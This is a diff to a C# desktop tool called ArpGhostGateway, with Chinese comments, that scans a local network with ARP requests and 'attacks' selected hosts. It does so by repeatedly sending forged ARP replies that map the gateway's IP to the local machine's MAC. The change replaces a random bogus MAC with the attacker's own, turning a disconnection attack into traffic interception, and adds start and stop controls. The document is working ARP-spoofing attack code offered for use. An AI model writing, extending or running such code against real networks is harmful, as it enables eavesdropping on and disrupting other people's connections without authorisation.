@@ -19,8 +19,10 @@ namespace ArpGhostGateway
     public class MainWindowViewModel : ObservableObject
     {
         private readonly TimeSpan _timeout = new TimeSpan(0, 0, 2);
-        private readonly CancellationTokenSource _cancellationTokenSource; //取消scan的token
-        private readonly CancellationTokenSource _cancellationTokenSource1;//取消攻击的token
+        private Task _scanTask = null;
+        private List<Task> _attackTasks = null;
+        private CancellationTokenSource _cancellationTokenSource; //取消scan的token
+        private CancellationTokenSource _cancellationTokenSource1;//取消攻击的token
 
         /// <summary>
         /// 所有的网卡设备集合
@@ -93,7 +95,7 @@ namespace ArpGhostGateway
         }
 
         private string _localIpText;
-        public string LocalIpText 
+        public string LocalIpText
         {
             get { return _localIpText; }
             set { SetProperty(ref _localIpText, value); }
@@ -139,18 +141,42 @@ namespace ArpGhostGateway
             get { return _endIpAddress; }
             set { SetProperty(ref _endIpAddress, value); }
         }
-        
+
+        private bool _isScanning;
+        public bool IsScanning
+        {
+            get { return _isScanning; }
+            set { SetProperty(ref _isScanning, value); }
+        }
+
+        /// <summary>
+        /// 是否正在攻击
+        /// </summary>
+        private bool _isAttacking;
+        public bool IsAttacking
+        {
+            get { return _isAttacking; }
+            set { SetProperty(ref _isAttacking, value); }
+        }
+
         public RelayCommand LoadedCommand { get; set; }
         public RelayCommand ShiftDeviceCommand { get; set; }
         public AsyncRelayCommand ScanCommand { get; set; }
+        public RelayCommand StopScanCommand { get; set; }
         public RelayCommand CallTargetComputerCommand { get; set; } //攻击目标主机
+        public RelayCommand StopCallTargetComputerCommand { get; set; }
 
         public MainWindowViewModel()
         {
+            IsScanning = false;
+            IsAttacking = false;
+            _attackTasks = new List<Task>();
             LoadedCommand = new RelayCommand(Loaded);
             ShiftDeviceCommand = new RelayCommand(ShiftDevice);
             ScanCommand = new AsyncRelayCommand(ScanAsync);
+            StopScanCommand = new RelayCommand(StopScan);
             CallTargetComputerCommand = new RelayCommand(CallTargetComputer);
+            StopCallTargetComputerCommand = new RelayCommand(StopCallTargetComputer);
             _cancellationTokenSource = new CancellationTokenSource();
             _cancellationTokenSource1 = new CancellationTokenSource();
         }
@@ -170,6 +196,7 @@ namespace ArpGhostGateway
 
             LibPcapLiveDevice = LibPcapLiveDevices.FirstOrDefault();
             ShiftDevice();
+            LoopforScanningStatus();//轮询scan的task状态
         }
 
         /// <summary>
@@ -180,6 +207,10 @@ namespace ArpGhostGateway
             if (LibPcapLiveDevice == null)
                 return;
 
+            LocalIp = null;
+            LocalMac = null;
+            GatewayIp = null;
+            GatewayMac = null;
             foreach (var address in LibPcapLiveDevice.Addresses)
             {
                 if (address.Addr.type == Sockaddr.AddressTypes.AF_INET_AF_INET6)
@@ -203,7 +234,10 @@ namespace ArpGhostGateway
 
             var gw = LibPcapLiveDevice.Interface.GatewayAddresses; // 网关IP
             //ipv4的gateway
-            GatewayIp = gw.FirstOrDefault(x => x.AddressFamily == AddressFamily.InterNetwork);
+            GatewayIp = gw?.FirstOrDefault(x => x.AddressFamily == AddressFamily.InterNetwork);
+            if (GatewayIp == null)
+                return;
+
             StartIpAddress = GatewayIp.ToString();
             EndIpAddress = GatewayIp.ToString();
             GatewayMac = Resolve(GatewayIp);
@@ -212,7 +246,7 @@ namespace ArpGhostGateway
         /// <summary>
         /// 扫描局域网
         /// </summary>
-        private async Task ScanAsync() 
+        private async Task ScanAsync()
         {
             IPAddress startIP, endIP;
             if (!IPAddress.TryParse(StartIpAddress, out startIP) || !IPAddress.TryParse(EndIpAddress, out endIP))
@@ -230,6 +264,37 @@ namespace ArpGhostGateway
             }
 
             await ScanLanAsync(start, end);
+        }
+
+        private void StopScan()
+        {
+            _cancellationTokenSource?.Cancel();
+        }
+
+        private void LoopforScanningStatus()
+        {
+            Task.Run(async () =>
+            {
+                while (true)
+                {
+                    //如果scantask已完成，则IsScanning = false;
+                    if ((_scanTask == null || _scanTask.IsCanceled || _scanTask.IsCompleted) && IsScanning)
+                    {
+                        Application.Current.Dispatcher.Invoke(() => IsScanning = false);
+                    }
+
+                    //如果attacktasks已完成，则IsScanning = false;
+                    if ((_attackTasks == null || _attackTasks.Count <= 0 || _attackTasks.All(x => x.IsCanceled)
+                            || _attackTasks.All(x => x.IsCompleted)) && IsAttacking)
+                    {
+                        _attackTasks?.Clear();
+                        _cancellationTokenSource1 = new CancellationTokenSource();
+                        Application.Current.Dispatcher.Invoke(() => IsAttacking = false);
+                    }
+
+                    await Task.Delay(500);
+                }
+            });
         }
 
         /// <summary>
@@ -263,7 +328,7 @@ namespace ArpGhostGateway
                 }
 
                 //read the next packet from the network
-                if (LibPcapLiveDevice.GetNextPacket(out var packet) > 0) 
+                if (LibPcapLiveDevice.GetNextPacket(out var packet) > 0)
                 {
                     if (packet.Device.LinkType != LinkLayers.Ethernet)
                     {
@@ -311,11 +376,12 @@ namespace ArpGhostGateway
             //open the device with 20ms timeout
             LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
             LibPcapLiveDevice.Filter = arpFilter;
-            await Task.Run(() =>
+            IsScanning = true;
+            _scanTask = Task.Run(() =>
             {
                 for (int i = 0; i < arpPackets.Length; ++i)
                 {
-                    if (_cancellationTokenSource.IsCancellationRequested) 
+                    if (_cancellationTokenSource.IsCancellationRequested)
                     {
                         break;
                     }
@@ -371,52 +437,89 @@ namespace ArpGhostGateway
                 Application.Current.Dispatcher.Invoke(() =>
                 {
                     MessageBox.Show("扫描完成");
+                    _cancellationTokenSource = new CancellationTokenSource();
                 });
             }, _cancellationTokenSource.Token);
+
+            await _scanTask;
         }
 
-        private void CallTargetComputer() 
+        private void CallTargetComputer()
         {
             if (Computers == null || Computers.All(x => !x.IsSelected))
             {
                 MessageBox.Show("没有合适的目标攻击主机");
                 return;
             }
-            
+
             var target = Computers.Where(x => x.IsSelected);
-            var wrongMAC = GetRandomPhysicalAddress();
-            foreach (var compute in Computers)
+            if (target.Count() <= 0)
+                return;
+
+            IsAttacking = true;
+            LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
+            foreach (var compute in target)
             {
-                var packet = BuildResponse(IPAddress.Parse(compute.IPAddress),PhysicalAddress.Parse(compute.MacAddress),GatewayIp, wrongMAC);
-                LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
-                var _ = Task.Run(async () =>
+                var packet = BuildResponse(IPAddress.Parse(compute.IPAddress), PhysicalAddress.Parse(compute.MacAddress), GatewayIp, LocalMac);
+                var aTask = Task.Run(async () =>
                 {
                     while (true)
                     {
-                        if (_cancellationTokenSource1.IsCancellationRequested) 
+                        if (_cancellationTokenSource1.IsCancellationRequested)
                         {
                             break;
                         }
-                        LibPcapLiveDevice.SendPacket(packet);
+                        try
+                        {
+                            LibPcapLiveDevice.SendPacket(packet);
+                        }
+                        catch (Exception ex)
+                        {
+                            MessageBox.Show(ex.Message);
+                        }
+
                         await Task.Delay(1000);
                     }
-
                     LibPcapLiveDevice.Close();
-                    MessageBox.Show("攻击结束");
                 }, _cancellationTokenSource1.Token);
+
+                _attackTasks.Add(aTask);
             }
         }
 
+        /// <summary>
+        /// 停止攻击主机
+        /// </summary>
+        private void StopCallTargetComputer() 
+        {
+            _cancellationTokenSource1?.Cancel();
+        }
+
+        /// <summary>
+        /// 构建arp请求
+        /// </summary>
+        /// <param name="destinationIP">目标地址</param>
+        /// <param name="localMac">本地mac地址</param>
+        /// <param name="localIP">本地ip地址</param>
+        /// <returns></returns>
         private Packet BuildRequest(IPAddress destinationIP, PhysicalAddress localMac, IPAddress localIP)
         {
             var ethernetPacket = new EthernetPacket(localMac, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.Arp);
             var arpPacket = new ArpPacket(ArpOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), destinationIP, localMac, localIP);
-
             // the arp packet is the payload of the ethernet packet
             ethernetPacket.PayloadPacket = arpPacket;
 
             return ethernetPacket;
         }
+
+        /// <summary>
+        /// 构建arp响应
+        /// </summary>
+        /// <param name="destIP">目标ip</param>
+        /// <param name="destMac">目标mac地址</param>
+        /// <param name="senderIP">发送人ip</param>
+        /// <param name="senderMac">发送人mac地址</param>
+        /// <returns></returns>
         private Packet BuildResponse(IPAddress destIP, PhysicalAddress destMac, IPAddress senderIP, PhysicalAddress senderMac)
         {
             // an arp packet is inside of an ethernet packet
@@ -427,20 +530,11 @@ namespace ArpGhostGateway
             ethernetPacket.PayloadPacket = arpPacket;
             return ethernetPacket;
         }
-
-        /// <summary>
-        /// 生成随机mac地址
-        /// </summary>
-        /// <returns></returns>
-        private PhysicalAddress GetRandomPhysicalAddress()
-        {
-            Random random = new Random(Environment.TickCount);
-            byte[] macBytes = new byte[] { 0x9C, 0x21, 0x6A, 0xC3, 0xB0, 0x27 };
-            macBytes[5] = (byte)random.Next(255);
-            return new PhysicalAddress(macBytes);
-        }
     }
 
+    /// <summary>
+    /// 局域网内的主机列表元素
+    /// </summary>
     public class Computer
     {
         public string IPAddress { get; set; }
